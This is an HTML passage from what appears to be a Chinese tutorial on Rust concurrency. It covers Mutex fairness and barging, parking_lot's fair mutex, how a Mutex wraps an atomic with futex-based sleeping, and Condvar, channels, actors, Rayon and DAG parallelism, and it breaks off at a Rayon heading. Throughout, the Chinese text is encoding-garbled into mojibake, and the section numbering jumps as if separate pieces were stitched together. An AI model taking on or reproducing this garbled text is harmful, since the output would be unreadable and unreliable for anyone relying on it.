<p>æ‰€ä»¥ï¼Œä½ åœ¨è®¾è®¡ Rust é«˜å¹¶å‘ç»“æ„æ—¶ï¼Œå¦‚æœèƒ½ç”¨Â <strong>Pointer Taggingï¼ˆè—åœ¨æŒ‡é’ˆé‡Œï¼‰</strong> Â æ˜¯æœ€é«˜æ•ˆçš„ï¼›å¦‚æœè—ä¸ä¸‹ï¼Œå°±è¦è€ƒè™‘èƒ½ä¸èƒ½ç”¨Â <code>AtomicU128</code>ï¼›å¦‚æœè¿˜ä¸è¡Œï¼Œå°±è€è€å®å®ç”¨Â <code>Mutex</code>Â å§ã€‚</p>
<h2 data-id="heading-20">äºŒ. Mutex</h2>
<p>ç²¾å‡†åœ°æ¦‚æ‹¬ç°ä»£ Mutexï¼ˆäº’æ–¥é”ï¼‰çš„ä¸¤ä¸ªæ ¸å¿ƒç—›ç‚¹ï¼š <strong>â€œå…¬å¹³æ€§é—®é¢˜â€</strong> Â å’ŒÂ  <strong>â€œåº•å±‚å®ç°åŸç†â€</strong> ã€‚</p>
<p>ä¸ºäº†è®©ä½ å½»åº•ç†è§£è¿™æ®µè¯ï¼Œæˆ‘ä»¬ç»§ç»­ç”¨ç”Ÿæ´»ä¸­çš„ä¾‹å­æ¥æ‹†è§£ã€‚æˆ‘ä»¬å°†åœºæ™¯è®¾å®šä¸ºï¼š<strong>åªæœ‰ä¸€æŠŠé’¥åŒ™çš„å…¬å…±ä¼‘æ¯å®¤</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-21">ä¸€ã€ ä¸ºä»€ä¹ˆä¼šæœ‰â€œä¸å…¬å¹³â€ï¼Ÿï¼ˆSpin vs. Waitï¼‰</h3>
<p>æåˆ°çš„ç¬¬ä¸€æ®µè¯æè¿°äº†ä¸€ä¸ªéå¸¸ç»å…¸çš„**â€œæ’é˜Ÿâ€**ï¼ˆBargingï¼‰ç°è±¡ã€‚</p>
<h4 data-id="heading-22">1. è§’è‰²åˆ†é…</h4>
<ul>
<li><strong>ä¼‘æ¯å®¤ï¼ˆCritical Sectionï¼‰ï¼š</strong> Â è¢«ä¿æŠ¤çš„æ•°æ®/ä»£ç ã€‚</li>
<li><strong>é’¥åŒ™ï¼ˆLockï¼‰ï¼š</strong> Â Mutexã€‚</li>
<li><strong>è€ç‹ï¼ˆæŒæœ‰é”çš„çº¿ç¨‹ï¼‰ï¼š</strong> Â æ­£åœ¨ä¼‘æ¯å®¤é‡Œä¼‘æ¯ã€‚</li>
<li><strong>å°æï¼ˆç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ï¼‰ï¼š</strong> Â ä¹‹å‰æ¥äº†å‘ç°æ²¡é’¥åŒ™ï¼Œè¢«æŒ‚èµ·ï¼ˆSleepingï¼‰ï¼Œååœ¨é—¨å£çš„é•¿æ¤…ä¸Šç¡ç€äº†ã€‚</li>
<li><strong>å°å¼ ï¼ˆæ–°æ¥çš„ Spin çº¿ç¨‹ï¼‰ï¼š</strong> Â åˆšåˆšåˆ°è¾¾ï¼Œç²¾åŠ›æ—ºç››ï¼Œæ­£åœ¨é—¨å£è½¬æ‚ ï¼ˆSpinningï¼‰ï¼Œè¿˜æ²¡å»é•¿æ¤…ä¸Šç¡è§‰ã€‚</li>
</ul>
<h4 data-id="heading-23">2. å‰§æƒ…æ¼”ç»ï¼šç”±äºâ€œæ—¶æœºå·§åˆâ€å¯¼è‡´çš„æ’é˜Ÿ</h4>
<ol>
<li><strong>è€ç‹å‡ºæ¥äº†ï¼š</strong> Â ä»–æ¨å¼€é—¨ï¼Œå¤§å–Šä¸€å£°ï¼šâ€œæˆ‘å¥½äº†ï¼Œè°æ˜¯ä¸‹ä¸€ä¸ªï¼Ÿâ€ï¼ˆè¿™æ˜¯ Mutex å”¤é†’é˜Ÿåˆ—çš„æ“ä½œï¼‰ã€‚</li>
<li><strong>å°æè¢«å”¤é†’ï¼š</strong> Â ç¡åœ¨é•¿æ¤…ä¸Šçš„å°æè¿·è¿·ç³Šç³Šåœ°çå¼€çœ¼ï¼Œå‡†å¤‡èµ·èº«ï¼Œä¼¸ä¸ªæ‡’è…°ï¼Œèµ°å‘é—¨å£ã€‚ï¼ˆ<strong>æ³¨æ„ï¼š</strong> Â ä»ç¡çœ åˆ°å”¤é†’å†åˆ°æŠ¢é”ï¼Œéœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼Œè¿™ä¸ªè¿‡ç¨‹å«<strong>ä¸Šä¸‹æ–‡åˆ‡æ¢</strong>ï¼Œè™½ç„¶å¾ˆå¿«ï¼Œä½†éœ€è¦æ—¶é—´ï¼Œæ¯”å¦‚ 5 å¾®ç§’ï¼‰ã€‚</li>
<li><strong>å°å¼ çš„éªšæ“ä½œï¼š</strong> Â å°±åœ¨è€ç‹åˆšæ‰”ä¸‹é’¥åŒ™ã€å°æè¿˜æ²¡å®Œå…¨ç«™èµ·æ¥çš„è¿™Â <strong>0.1 ç§’</strong>Â é—´éš™é‡Œï¼Œ<strong>ä¸€ç›´åœ¨é—¨å£è½¬æ‚ çš„å°å¼ </strong>çœ¼ç–¾æ‰‹å¿«ï¼Œä¸€æŠŠæŠ“ä½äº†é’¥åŒ™å†²è¿›äº†ä¼‘æ¯å®¤ï¼</li>
<li><strong>ç»“æœï¼š</strong> Â ç­‰å°æç»ˆäºèµ°åˆ°é—¨å£ï¼Œå‘ç°é—¨åˆé”äº†ï¼å°æå¿ƒæ€å´©äº†ï¼Œåªèƒ½å›åˆ°é•¿æ¤…ä¸Šç»§ç»­ç¡ã€‚</li>
</ol>
<h4 data-id="heading-24">3. ä¸ºä»€ä¹ˆé»˜è®¤ Mutex å…è®¸è¿™æ ·ï¼Ÿ</h4>
<p>ä¼šè§‰å¾—è¿™ä¸å…¬å¹³ï¼Œå°å¼ æ˜æ˜åˆšæ¥ï¼Œå‡­ä»€ä¹ˆæ’é˜Ÿï¼Ÿ ä½†åœ¨è®¡ç®—æœºçœ¼é‡Œï¼Œ<strong>è¿™ä¸ºäº†æ•ˆç‡ï¼ˆååé‡ï¼‰</strong> ã€‚</p>
<ul>
<li>å”¤é†’å°æéœ€è¦æ—¶é—´ï¼ˆCPU åˆ‡æ¢å¼€é”€ï¼‰ã€‚</li>
<li>å°å¼ å·²ç»åœ¨ CPU ä¸Šè·‘ç€äº†ï¼ˆçƒ­æ•°æ®ï¼‰ã€‚</li>
<li>è®©å°å¼ å…ˆæŠŠæ´»å¹²å®Œï¼ŒCPU å°±ä¸éœ€è¦ç©ºè½¬ç­‰å¾…å°æé†’æ¥ã€‚<strong>æ•´ä½“ä¸Šï¼Œä¼‘æ¯å®¤çš„ä½¿ç”¨ç‡æ›´é«˜äº†ã€‚</strong></li>
</ul>
<hr/>
<h3 data-id="heading-25">äºŒã€Â <code>parking_lot</code>Â çš„ Fair Mutex æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>æåˆ°çš„Â <code>parking_lot</code>Â æ˜¯ Rust ä¸­ä¸€ä¸ªæ€§èƒ½æå¼ºçš„å¹¶å‘åº“ã€‚å®ƒæä¾›çš„Â <strong>Fair Mutexï¼ˆå…¬å¹³é”ï¼‰</strong> Â å°±æ˜¯ä¸ºäº†æ•´æ²»å°å¼ è¿™ç§â€œæ’é˜Ÿâ€è¡Œä¸ºã€‚</p>
<h4 data-id="heading-26">1. å®ƒçš„è§„åˆ™ï¼šä¸¥æ ¼æ’é˜Ÿ</h4>
<p>åœ¨ Fair Mutex æ¨¡å¼ä¸‹ï¼Œè§„åˆ™å˜äº†ï¼š</p>
<ul>
<li>å½“è€ç‹æ‰”å‡ºé’¥åŒ™æ—¶ï¼Œä»–ä¸æ˜¯æŠŠé’¥åŒ™æ‰”åœ¨åœ°ä¸Šè°æŠ¢åˆ°ç®—è°çš„ã€‚</li>
<li>ä»–æ˜¯<strong>ç›´æ¥æŠŠé’¥åŒ™é€’ç»™é•¿æ¤…ä¸Šçš„ç¬¬ä¸€ä½ï¼ˆå°æï¼‰</strong> ã€‚</li>
<li>æˆ–è€…ï¼Œå³ä½¿é’¥åŒ™åœ¨åœ°ä¸Šï¼Œ<strong>æ–°æ¥çš„å°å¼ </strong>å¦‚æœçœ‹åˆ°é•¿æ¤…ä¸Šæœ‰äººåç€ï¼Œ<strong>å¿…é¡»</strong>è‡ªè§‰å»é•¿æ¤…åé¢æ’é˜Ÿï¼Œç»å¯¹ä¸å…è®¸å»æŠ¢é’¥åŒ™ã€‚</li>
</ul>
<h4 data-id="heading-27">2. ä»£ä»·</h4>
<ul>
<li><strong>ä¼˜ç‚¹ï¼š</strong> Â ç»å¯¹å…¬å¹³ï¼ˆFIFOï¼‰ï¼Œå…ˆæ¥ååˆ°ï¼Œä¸ä¼šå‡ºç°å°ææ°¸è¿œæŠ¢ä¸åˆ°é”é¥¿æ­»ï¼ˆStarvationï¼‰çš„æƒ…å†µã€‚</li>
<li><strong>ç¼ºç‚¹ï¼š</strong> Â å¯èƒ½ä¼šç¨å¾®æ…¢ä¸€ç‚¹ç‚¹ï¼Œå› ä¸ºå¿…é¡»è¦ç­‰å°æé†’è¿‡æ¥ï¼ˆä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€æ— æ³•é¿å…äº†ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-28">ä¸‰ã€ Mutex ä¸ Atomic çš„å…³ç³»ï¼šå¤§é”åŒ…å°é”</h3>
<p>æåˆ°çš„æœ€åä¸€å¥éå¸¸æœ‰æ·±åº¦ï¼š <em>â€œä½ å¯ä»¥æŠŠ Mutex æƒ³è±¡æˆä¸€ä¸ªç²’åº¦æ›´å¤§çš„ atomicï¼Œåªä¸è¿‡è¿™ä¸ª atomic ä¸æ˜¯ cpu ä¿è¯çš„ï¼Œè€Œæ˜¯è½¯ä»¶ç®—æ³•å®ç°çš„ã€‚â€</em></p>
<p>è¿™å¥è¯æ­ç¤ºäº† Mutex çš„<strong>æœ¬è´¨æ¶æ„</strong>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠ Mutex çœ‹ä½œä¸€ä¸ª<strong>æ´‹è‘±ç»“æ„</strong>ï¼Œç”±å†…è€Œå¤–åˆ†ä¸ºä¸¤å±‚ï¼š</p>
<h4 data-id="heading-29">1. å†…æ ¸ï¼ˆç¡¬ä»¶å±‚ï¼‰ï¼šAtomic</h4>
<p>Mutex çš„æœ€æ ¸å¿ƒéƒ¨åˆ†ï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„Â <strong>Atomic Bool</strong>ï¼ˆæˆ–è€… Atomic Integerï¼‰ã€‚</p>
<ul>
<li><strong>ä½œç”¨ï¼š</strong> Â ä»…ä»…ç”¨æ¥æ ‡è®°â€œæœ‰äººâ€è¿˜æ˜¯â€œæ²¡äººâ€ã€‚</li>
<li><strong>æ“ä½œï¼š</strong> Â ä½¿ç”¨ CPU çš„Â <code>CAS</code>Â æŒ‡ä»¤ç¬é—´æŠŠÂ <code>0</code>Â æ”¹æˆÂ <code>1</code>ã€‚</li>
<li><strong>å±€é™ï¼š</strong> Â å®ƒåªèƒ½å‘Šè¯‰ä½ â€œæ”¹æˆåŠŸäº†â€è¿˜æ˜¯â€œå¤±è´¥äº†â€ã€‚å¦‚æœå¤±è´¥äº†ï¼Œå®ƒä¸ç®¡ä½ ï¼Œä½ åªèƒ½ä¸åœåœ°è¯•ï¼ˆSpinï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-30">2. å¤–å£³ï¼ˆè½¯ä»¶/ç³»ç»Ÿå±‚ï¼‰ï¼šWaiting Logic</h4>
<p>å•çº¯çš„ Atomic å¦‚æœä¸€ç›´æŠ¢ä¸åˆ°é”ï¼ŒCPU ä¼šä¸€ç›´ç©ºè½¬ï¼ˆåƒå°å¼ ä¸€æ ·åœ¨é—¨å£è½¬åœˆï¼‰ï¼Œè¿™ä¼šæŠŠç”µè„‘å‘çƒ­çƒ§ç©¿ã€‚ Mutex åœ¨ Atomic å¤–é¢åŒ…è£¹äº†ä¸€å±‚**â€œç¡çœ /å”¤é†’é€»è¾‘â€**ï¼š</p>
<ul>
<li><strong>é€»è¾‘ï¼š</strong> Â å¦‚æœæˆ‘ç”¨ AtomicÂ <code>CAS</code>Â æŠ¢é”å¤±è´¥äº†ï¼Œæˆ‘ä¸è¦ä¸€ç›´å‚»è½¬ã€‚æˆ‘å»æ±‚æ“ä½œç³»ç»Ÿï¼ˆOS Kernelï¼‰ï¼šâ€œæŠŠæˆ‘æŒ‚èµ·ï¼ˆPark/Sleepï¼‰ï¼Œç­‰é”ç©ºå‡ºæ¥äº†å«é†’æˆ‘ã€‚â€</li>
<li><strong>å·¥å…·ï¼š</strong> Â åœ¨ Linux ä¸Šè¿™å«Â <code>futex</code>ï¼Œåœ¨ Windows ä¸Šå«Â <code>KeyedEvent</code>ã€‚</li>
</ul>
<h4 data-id="heading-31">æ€»ç»“å›¾è§£</h4>






























<table><thead><tr><th>ç»´åº¦</th><th>Atomic</th><th>Mutex</th></tr></thead><tbody><tr><td><strong>æ˜¯ä»€ä¹ˆ</strong></td><td><strong>ç¡¬ä»¶æŒ‡ä»¤</strong>Â (CPU å±‚é¢)</td><td><strong>è½¯ä»¶æ•°æ®ç»“æ„</strong>Â (æ“ä½œç³»ç»Ÿ/åº“å±‚é¢)</td></tr><tr><td><strong>åŒ…å«å†…å®¹</strong></td><td>ä»…ä»…æ˜¯ä¸€ä¸ª 0/1 çš„å¼€å…³</td><td><strong>å¼€å…³ (Atomic)</strong> Â +Â <strong>ç­‰å¾…é˜Ÿåˆ— (Queue)</strong> Â +Â <strong>è°ƒåº¦é€»è¾‘</strong></td></tr><tr><td><strong>æŠ¢ä¸åˆ°æ€ä¹ˆåŠ</strong></td><td>åªèƒ½é‡è¯• (Spin)</td><td>å¯ä»¥é€‰æ‹©ç¡è§‰ (Sleep/Park)</td></tr><tr><td><strong>æ¯”å–»</strong></td><td>é—¨æŠŠæ‰‹ä¸Šçš„é”èŠ¯</td><td>åŒ…å«äº†é”èŠ¯ã€é—¨å«ã€ç­‰å€™åŒºçš„ä¸€æ•´å¥—ç®¡ç†ç³»ç»Ÿ</td></tr></tbody></table>
<p><strong>ä¸€å¥è¯æ€»ç»“ï¼š</strong> Â Mutex å°±æ˜¯åˆ©ç”¨Â <strong>Atomic</strong>Â è¿™ä¸€å—â€œç¡¬ç –å¤´â€ï¼Œé…åˆæ“ä½œç³»ç»Ÿçš„è°ƒåº¦èƒ½åŠ›ï¼Œç›–å‡ºäº†ä¸€é—´æ—¢èƒ½é”é—¨ã€åˆèƒ½è®©æ’é˜Ÿçš„äººæœ‰åœ°æ–¹ç¡è§‰çš„â€œæˆ¿å­â€ã€‚</p>
<ul>
<li>
<p><strong>Mutex / RwLock (äº’æ–¥é”):</strong></p>
<ul>
<li><strong>è§’è‰²ï¼š</strong> Â æˆ¿é—´çš„é—¨é”ã€‚ä¸€æ¬¡åªèƒ½è¿›ä¸€ä¸ªäººã€‚</li>
<li><strong>å¹¶è¡Œæ€§ï¼š</strong> Â <strong>å®ƒæ˜¯å¹¶è¡Œçš„æ€æ‰‹</strong>ã€‚åœ¨é”çš„èŒƒå›´å†…ï¼Œä»£ç è¢«è¿«å˜æˆä¸²è¡Œï¼ˆSerialï¼‰ã€‚å¦‚æœä½ åˆ°å¤„ç”¨ Mutexï¼Œä½ çš„å¤šæ ¸ CPU å°±é€€åŒ–æˆäº†å•æ ¸ã€‚</li>
</ul>
</li>
<li>
<p><strong>Condvar (æ¡ä»¶å˜é‡):</strong></p>
<ul>
<li><strong>è§’è‰²ï¼š</strong> Â ä¿¡å·æªã€‚çº¿ç¨‹ A è¯´â€œæˆ‘æ²¡æ‹¿åˆ°æ•°æ®ï¼Œæˆ‘ç¡äº†â€ï¼Œçº¿ç¨‹ B åšå®Œäº‹åå¼€ä¸€æªâ€œæ•°æ®å¥½äº†ï¼Œé†’é†’â€ã€‚</li>
<li><strong>ä½œç”¨ï¼š</strong> Â ç”¨äºçº¿ç¨‹é—´çš„<strong>ç­‰å¾…/å”¤é†’</strong>åè°ƒï¼Œæ˜¯å¹¶å‘è°ƒåº¦å·¥å…·ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-32">2. å¯¹è®²æœºä¸å¿«é€’ï¼šè§£è€¦ä¸é€šä¿¡ (Communication)</h3>
<p>è¿™éƒ¨åˆ†æ˜¯ä¸ºäº†è®©ä¸åŒçš„ä»»åŠ¡ä¹‹é—´èƒ½å¤Ÿ<strong>åä½œ</strong>ã€‚å®ƒä»¬ä¸ç›´æ¥äº§ç”Ÿå¹¶è¡Œï¼Œä½†å®ƒä»¬è®©å¹¶è¡Œæˆä¸ºå¯èƒ½ï¼ˆæ²¡æœ‰é€šä¿¡çš„å¹¶è¡Œæ˜¯çå­ï¼‰ã€‚</p>
<ul>
<li>
<p><strong>Channel (é€šé“ / CSPæ¨¡å¼):</strong></p>
<ul>
<li><strong>è§’è‰²ï¼š</strong> Â ä¼ é€å¸¦ã€‚</li>
<li><strong>Rust ç‰¹è‰²ï¼š</strong> Â <code>mpsc</code>Â (Multi-producer, Single-consumer)ã€‚</li>
<li><strong>å¹¶è¡Œå…³ç³»ï¼š</strong> Â ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…å¯ä»¥åœ¨ä¸åŒçš„æ ¸å¿ƒä¸Š<strong>å¹¶è¡Œ</strong>å·¥ä½œï¼ŒChannel è´Ÿè´£å®‰å…¨åœ°ä¼ é€’æ•°æ®ã€‚è¿™æ˜¯å®ç°â€œæµæ°´çº¿å¹¶è¡Œâ€çš„å…³é”®ã€‚</li>
</ul>
</li>
<li>
<p><strong>Actor Mode (æ¼”å‘˜æ¨¡å‹):</strong></p>
<ul>
<li><strong>è§’è‰²ï¼š</strong> Â ç‹¬ç«‹çš„åŠäº‹å‘˜ã€‚æ¯ä¸ª Actor æœ‰è‡ªå·±çš„é‚®ç®±ï¼Œåªå¤„ç†å‘ç»™å®ƒçš„ä¿¡ã€‚</li>
<li><strong>Rust ç”Ÿæ€ï¼š</strong> Â æ¯”å¦‚Â <code>Actix</code>Â åº“ã€‚</li>
<li><strong>å¹¶è¡Œå…³ç³»ï¼š</strong> Â æ¯ä¸ª Actor å¯ä»¥è·‘åœ¨ä¸åŒçš„çº¿ç¨‹ä¸Šã€‚è¿™æ˜¯ä¸€ç§éå¸¸é«˜çº§çš„<strong>å¹¶å‘æ¶æ„</strong>ï¼Œå¤©ç„¶æ”¯æŒåˆ†å¸ƒå¼å’Œå¹¶è¡Œã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-33">3. æˆ˜ç•¥å›¾çº¸ï¼šçœŸæ­£çš„å¹¶è¡Œè®¾è®¡ (Parallelism Patterns)</h3>
<p>è¿™é‡Œæ˜¯æåˆ°çš„**â€œè®¾è®¡å¹¶è¡Œâ€<strong>çš„åœ°æ–¹ã€‚è¿™äº›ä¸æ˜¯å…·ä½“çš„â€œé”â€æˆ–â€œå˜é‡â€ï¼Œè€Œæ˜¯</strong>ç»„ç»‡ä»£ç ç»“æ„çš„æ–¹æ³•**ï¼Œç›®çš„æ˜¯ä¸ºäº†æŠŠä»»åŠ¡æ‹†æ•£ï¼Œå¡æ»¡æ‰€æœ‰çš„ CPU æ ¸å¿ƒã€‚</p>
<ul>
<li>
<p><strong>Free Competition (è‡ªç”±ç«äº‰ / ä»»åŠ¡æŠ¢å ):</strong></p>
<ul>
<li><strong>æ¨¡å¼ï¼š</strong> Â æ¯”å¦‚çº¿ç¨‹æ± ï¼ˆThread Poolï¼‰ã€‚ä¸¢è¿›å» 100 ä¸ªä»»åŠ¡ï¼Œç”± 8 ä¸ªå·¥äººï¼ˆæ ¸å¿ƒï¼‰å»æŠ¢ã€‚</li>
<li><strong>Rustï¼š</strong> Â è¿™é‡Œçš„å…¸å‹æ˜¯Â <code>tokio</code>Â (è™½ç„¶ä¸»è¦ç”¨äºå¼‚æ­¥ IO å¹¶å‘) æˆ–Â <code>rayon</code>Â çš„åº•å±‚çš„ Work-stealingï¼ˆå·¥ä½œçªƒå–ï¼‰æœºåˆ¶ã€‚è¿™æ˜¯<strong>ä»»åŠ¡å¹¶è¡Œ</strong>ã€‚</li>
</ul>
</li>
<li>
<p><strong>Map/Reduce (æ˜ å°„/å½’çº¦):</strong></p>
<ul>
<li>
<p><strong>æ¨¡å¼ï¼š</strong></p>
<ul>
<li><strong>Map:</strong> Â æŠŠä¸€ä¸ªå¤§æ•°ç»„åˆ‡æˆ 8 ä»½ï¼Œ8 ä¸ªæ ¸åŒæ—¶å¤„ç†ï¼ˆè¿™æ˜¯çº¯ç²¹çš„<strong>æ•°æ®å¹¶è¡Œ</strong>ï¼‰ã€‚</li>
<li><strong>Reduce:</strong> Â æŠŠ 8 ä¸ªç»“æœæ±‡æ€»èµ·æ¥ã€‚</li>
</ul>
</li>
<li>
<p><strong>Rust ç¥å™¨ï¼š</strong> Â <strong><code>Rayon</code></strong>ã€‚è¿™æ˜¯ Rust ç•Œåšå¹¶è¡Œçš„æ ‡å‡†ç­”æ¡ˆã€‚ä½ åªéœ€è¦æŠŠÂ <code>.iter()</code>Â æ”¹æˆÂ <code>.par_iter()</code>ï¼Œä»£ç å°±ä»å•æ ¸å˜æˆäº†å¤šæ ¸å¹¶è¡Œã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>DAG (æœ‰å‘æ— ç¯å›¾):</strong></p>
<ul>
<li><strong>æ¨¡å¼ï¼š</strong> Â ä»»åŠ¡ A åšå®Œï¼Œè§¦å‘ B å’Œ C åŒæ—¶åšï¼ˆå¹¶è¡Œï¼‰ï¼ŒB å’Œ C éƒ½åšå®Œï¼Œè§¦å‘ Dã€‚</li>
<li><strong>Rustï¼š</strong> Â è¿™ç§æ¨¡å¼ç”¨äºå¤æ‚çš„<strong>ä»»åŠ¡ä¾èµ–å¹¶è¡Œ</strong>ã€‚Rust çš„æ„å»ºå·¥å…· Cargo ç¼–è¯‘ä½ çš„ä»£ç æ—¶ï¼Œå°±æ˜¯ç”¨ DAG æ¨¡å¼ï¼šäº’ä¸ä¾èµ–çš„ crate å°±åœ¨ä¸åŒæ ¸å¿ƒä¸Šå¹¶è¡Œç¼–è¯‘ã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-34">ç®€å•æ€»ç»“</h3>



































<table><thead><tr><th>æ¦‚å¿µ</th><th>å®ƒæ˜¯å¹²å˜›çš„ï¼Ÿ</th><th>ä¸å¹¶è¡Œçš„å…³ç³»</th></tr></thead><tbody><tr><td><strong>Atomic / Mutex</strong></td><td><strong>ä¿å‘½çš„</strong>Â (Safety)</td><td>é˜²æ­¢å¹¶è¡Œå‡ºè½¦ç¥¸ï¼Œ<strong>å±€éƒ¨é˜»æ­¢å¹¶è¡Œ</strong></td></tr><tr><td><strong>Condvar</strong></td><td><strong>è°ƒåº¦çš„</strong>Â (Signaling)</td><td>åè°ƒæš‚åœå’Œå¼€å§‹</td></tr><tr><td><strong>Channel / Actor</strong></td><td><strong>ä¼ è¯çš„</strong>Â (Communication)</td><td>è¿æ¥å¹¶è¡Œçš„å²›å±¿</td></tr><tr><td><strong>Map/Reduce</strong></td><td><strong>æç”Ÿäº§çš„</strong>Â (Data Parallelism)</td><td><strong>çœŸæ­£çš„å¹¶è¡Œ</strong>ï¼šæŠŠå¤§è±¡åˆ‡å—åˆ†ç»™å¤šäººæ¬</td></tr><tr><td><strong>DAG</strong></td><td><strong>æç®¡ç†çš„</strong>Â (Task Parallelism)</td><td><strong>çœŸæ­£çš„å¹¶è¡Œ</strong>ï¼šå®‰æ’è°å…ˆè°åï¼Œèƒ½åŒæ—¶åšçš„å°½é‡åŒæ—¶åš</td></tr></tbody></table>
<p>Atomic è™½ç„¶å¯ä»¥å¤„ç†è‡ªç”±ç«äº‰æ¨¡å¼ä¸‹åŠ é”çš„éœ€æ±‚ï¼Œä½†æ¯•ç«Ÿç”¨èµ·æ¥ä¸é‚£ä¹ˆæ–¹ä¾¿ï¼Œæˆ‘ä»¬éœ€è¦æ›´
é«˜å±‚çš„å¹¶å‘åŸè¯­ï¼Œæ¥ä¿è¯è½¯ä»¶ç³»ç»Ÿæ§åˆ¶å¤šä¸ªçº¿ç¨‹å¯¹åŒä¸€ä¸ªå…±äº«èµ„æºçš„è®¿é—®ï¼Œä½¿å¾—æ¯ä¸ªçº¿ç¨‹
åœ¨è®¿é—®å…±äº«èµ„æºçš„æ—¶å€™ï¼Œå¯ä»¥ç‹¬å æˆ–è€…è¯´äº’æ–¥è®¿é—®ï¼ˆmutual exclusive accessï¼‰ã€‚</p>
<h3 data-id="heading-35">1. å…±äº«çŠ¶æ€ï¼š<code>Arc</code>Â +Â <code>Mutex</code></h3>
<p><strong>æ€»ç»“ï¼š</strong> Â â€œlockè§£é”â€Â <strong>è¡¥å……ç»†èŠ‚ï¼ˆå…³é”®ï¼‰ï¼š</strong></p>
<ul>
<li>
<p><strong>Arc (æ‹¿å·):</strong> Â è´Ÿè´£<strong>æ¬è¿</strong>ã€‚æ²¡æœ‰å®ƒï¼Œæ‰€æœ‰æƒè§„åˆ™ä¸å…è®¸ä½ æŠŠåŒä¸€ä¸ªå˜é‡å¡ç»™ 10 ä¸ªçº¿ç¨‹ã€‚å®ƒè®©å¤§å®¶éƒ½æœ‰åˆæ³•çš„â€œå¼•ç”¨â€ã€‚</p>
</li>
<li>
<p><strong>Mutex (å¼€é—¨):</strong> Â è´Ÿè´£<strong>äº’æ–¥</strong>ã€‚</p>
</li>
<li>
<p><strong>è‡ªåŠ¨è§£é” (RAII):</strong> Â Rust æœ€é…·çš„åœ°æ–¹åœ¨äº<strong>ä½ ä¸éœ€è¦å†™Â <code>unlock()</code></strong> ã€‚</p>
<ul>
<li><code>lock().unwrap()</code>Â æ˜¯ä¸Šé”ã€‚</li>
<li><strong>è§£é”</strong>æ˜¯éšå¼çš„ï¼šå½“æŒæœ‰é”çš„é‚£ä¸ªå˜é‡ï¼ˆæ¯”å¦‚ä»£ç é‡Œçš„Â <code>data</code>ï¼‰ç¦»å¼€Â <code>{ ... }</code>Â ä½œç”¨åŸŸæ—¶ï¼ŒRust è‡ªåŠ¨å¸®ä½ è§£é”ã€‚</li>
<li><em>ä¸ç”¨æ€•å¿˜äº†è§£é”å¯¼è‡´æ­»é”ï¼Œç¼–è¯‘å™¨å¸®ä½ ç®¡ç€ã€‚</em></li>
</ul>
</li>
</ul>
<h3 data-id="heading-36">2. çº¿ç¨‹åŒæ­¥ï¼š<code>join()</code></h3>
<p><strong>æ€»ç»“ï¼š</strong> Â â€œç­‰å¾…â€Â <strong>è¡¥å……ç»†èŠ‚ï¼ˆå…³é”®ï¼‰ï¼š</strong></p>
<ul>
<li><strong>ä¸»çº¿ç¨‹çš„è€å¿ƒ:</strong> Â <code>main</code>Â å‡½æ•°æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªçº¿ç¨‹ã€‚å¦‚æœÂ <code>main</code>Â è·‘å®Œäº†ï¼Œå®ƒ<strong>ä¸ä¼š</strong>ç­‰å­çº¿ç¨‹ï¼Œç›´æ¥æ€è¿›ç¨‹é€€å‡ºã€‚</li>
<li><code>join()</code>Â å°±æ˜¯è®©Â <code>main</code>Â çº¿ç¨‹<strong>å¡åœ¨è¿™é‡Œï¼ˆBlockï¼‰</strong> ï¼Œç›´åˆ°å­çº¿ç¨‹è·‘å®Œäº¤å·®ã€‚å®ƒæ˜¯é˜²æ­¢â€œçƒ‚å°¾å·¥ç¨‹â€çš„å…œåº•æœºåˆ¶ã€‚</li>
</ul>
<h3 data-id="heading-37">3. æ¶ˆæ¯ä¼ é€’ï¼š<code>mpsc::channel</code></h3>
<p><strong>æ€»ç»“ï¼š</strong> Â â€œlet (tx,rx)=...; cloneï¼Œç„¶åæ¶ˆè´¹rxâ€Â <strong>è¡¥å……ç»†èŠ‚ï¼ˆå…³é”®ï¼‰ï¼š</strong></p>
<ul>
<li>
<p><strong>å…‹éš†è°ï¼Ÿ</strong> Â åªèƒ½å…‹éš†Â <code>tx</code>Â (å‘é€ç«¯)ï¼Œè¿™å°±æ˜¯Â <strong>M</strong>ulti-<strong>P</strong>roducer (å¤šç”Ÿäº§è€…)ã€‚<code>rx</code>Â (æ¥æ”¶ç«¯) å¿…é¡»ç‹¬äº«ã€‚</p>
</li>
<li>
<p><strong>æ‰€æœ‰æƒè½¬ç§»:</strong> Â <code>tx.send(val)</code>Â ä¹‹åï¼Œ<code>val</code>Â å°±å½’Â <code>rx</code>Â äº†ï¼ŒåŸæ¥çš„çº¿ç¨‹å†ä¹Ÿç¢°ä¸åˆ°å®ƒã€‚è¿™æ˜¯ä¸ºäº†å®‰å…¨ã€‚</p>
</li>
<li>
<p><strong>æ–­å¼€ä¿¡å·:</strong> Â <code>rx</code>Â çš„Â <code>for</code>Â å¾ªç¯ä»€ä¹ˆæ—¶å€™åœï¼Ÿåªæœ‰å½“<strong>æ‰€æœ‰çš„</strong>Â <code>tx</code>Â éƒ½è¢«Â <code>drop</code>Â æ‰ä¹‹åï¼Œ<code>rx</code>Â æ‰ä¼šçŸ¥é“â€œæ²¡äººå‘æ¶ˆæ¯äº†â€ï¼Œä»è€Œç»“æŸå¾ªç¯ã€‚</p>
<ul>
<li><em>å‘ç‚¹ï¼šè¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸»çº¿ç¨‹é‡Œè¦Â <code>drop(tx)</code>ï¼Œå¦åˆ™Â <code>rx</code>Â ä¼šä¸€ç›´ç­‰ä¸‹å»ã€‚</em></li>
</ul>
</li>
</ul>
<h3 data-id="heading-38">4. æ•°æ®å¹¶è¡Œï¼š<code>Rayon</code></h3>
